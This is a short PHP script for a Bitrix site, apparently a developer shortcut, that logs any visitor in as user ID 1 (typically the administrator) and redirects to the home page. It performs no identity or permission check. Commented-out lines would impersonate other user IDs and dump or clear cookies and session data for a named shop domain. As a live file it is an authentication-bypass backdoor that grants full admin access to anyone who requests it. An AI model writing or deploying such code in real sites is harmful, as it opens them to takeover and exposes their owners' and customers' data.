<?php
// require($_SERVER["DOCUMENT_ROOT"]."/bitrix/header.php");
require($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_before.php");
// global $USER;
$USER->Authorize(1);


//$USER->Authorize(106721);


//$USER->Authorize(7);
//	$USER->Authorize(48091);

// PR($_COOKIE, true);
// PR($_SESSION, true);

// foreach($_COOKIE as $k => $i){
// setCookie($k, "");
// setCookie($k, "", time() - 7 * 24 * 3600, '/', 'www.shophair.ru');

// }

// $_SESSION = array();

// PR($_SESSION, true);
// PR($_COOKIE, true);
LocalRedirect("/");

// GIFT_MEN_WOMEN
?>123